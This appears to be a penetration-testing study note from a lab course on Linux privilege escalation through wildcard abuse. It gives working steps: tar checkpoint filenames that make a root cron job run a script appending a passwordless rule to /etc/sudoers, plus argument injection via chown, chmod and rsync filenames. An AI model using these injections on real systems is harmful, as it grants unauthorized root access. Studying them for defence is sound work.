---
id: Wildcard Abuse
aliases: []
tags:
  - Linux/Privesc/Environment/Wildcard-Abuse
links: "[[Linux]]"
---

<!-- Wildcard Abuse {{{-->
# Wildcard Abuse

**Wildcard Abuse** privilege escalation
is when an attacker exploits how shell wildcards are expanded in commands
run with higher privileges

<!-- Info {{{-->
> [!info]- Wildcards
>
>  - `*`: Match any number of characters in a file name
>  - `?`: Match a single character
>  - `[ ]`: Brackets enclose characters and can match any single one at the defined position
>  - `~`: A tilde at the beginning expands to the name of the user home directory
>         or can have another username appended to refer to that user's home directory
>  - `-`: A hyphen within brackets denote a range of characters
>
<!-- }}} -->

___

<!-- Example {{{-->
## Example

The [tar](https://linux.die.net/man/1/tar) command allows
to execute a shell command when `checkpoint` is set

<!-- Example {{{-->
> [!example]-
>
> ```sh
> man tar
> ```
> ```sh
> <SNIP>
> Informative output
>        --checkpoint[=N]
>               Display progress messages every Nth record (default 10).
>
>        --checkpoint-action=ACTION
>               Run ACTION on each checkpoint.
> ```
<!-- }}} -->

A [[Cron Jobs]] is set
to back up the `home/htb-student` directory
and create a compressed archive every minute

<!-- Example {{{-->
> [!example]-
>
> ```sh
> #
> #
> mh dom mon dow command
> */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
> ```
<!-- }}} -->

Write out the command names as filenames

<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb-student@NIX02:~$ ls -la
> ```
>
> ```sh
> total 56
> drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
> drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
> -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
> -rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Enumeration {{{-->
## Enumeration

Enumerate [[Cron Jobs]] if their script executed by root
has a `*` inside a command

<!-- Example {{{-->
> [!example]-
>
> ```sh
> #
> #
> mh dom mon dow command
> */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
> ```
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Not vulnerable if the wildcard is preceded of a path
>
> ```sh
> /some/path/*
> ```
>
> ```sh
> ./*
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Exploitation {{{-->
## Exploitation

<!-- 7-Zip {{{-->
### 7-Zip

[7-Zip](https://www.7-zip.org/) /
[7z](https://linux.die.net/man/1/7z) /
[7za](https://linux.die.net/man/1/7za)

<!-- }}} -->

<!-- Chown / Chmod {{{-->
### Chown / Chmod

Copy the owner/group or the permission bits of an arbitrary file
by abusing the `--reference` flag

```sh
touch "--reference=/root/secret``file"
```

<!-- Info {{{-->
> [!info]-
>
> The filename becomes an argument and will be executed like
>
> ```sh
> chown -R alice:alice *.php
> ```
> ```sh
> chmod -R 644 *.php
> ```
>
> `--reference=/root/secret``file` is injected,
> causing all matching files to inherit the ownership/permissions
> of /root/secret``file
<!-- }}} -->


<!-- }}} -->

<!-- Tar {{{-->
### Tar

[tar](https://linux.die.net/man/1/tar) —
Execute arbitrary commands by abusing the `checkpoint` feature

1. `root.sh`: Add the user to `/etc/sudoers`

```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

```sh
chmod +x root.sh
```

2. `--checkpoint=1`: Set `tar` checkpoint to `1`

```sh
echo "" > --checkpoint=1
```

3. `--checkpoint-action=exec=sh root.sh`:
   Execute `root.sh` on `tar` checkpoint

```sh
echo "" > "--checkpoint-action=exec=sh root.sh"
```

The [[Cron Jobs|Cron Job]]'s wildcard be interpreted
and expanded by the shell to execute `root.sh`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz
> --checkpoint=1 --checkpoint-action=exec=sh root.sh
> ```
<!-- }}} -->

`root.sh` adds the user to `/etc/sudoers`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo -l
> ```
> ```sh
> Matching Defaults entries for htb-student on NIX02:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User htb-student may run the following commands on NIX02:
>     (root) NOPASSWD: ALL
> ```
<!-- }}} -->

<!-- }}} -->

<!-- rsync {{{-->
### rsync

`rsync` allows to override the remote shell
or even the remote binary via command-line flags
that start with `-e` or `--rsync-path`

In an attacker-controlled directory

```sh
touch "-e sh shell.sh"
# -e <cmd> => use <cmd> instead of ssh
```

If root archives the directory with
`rsync -az * backup:/srv/`,
the injected flag spawns a shell on the remote side


<!-- }}} -->




___
<!-- }}} -->

<!-- }}} -->
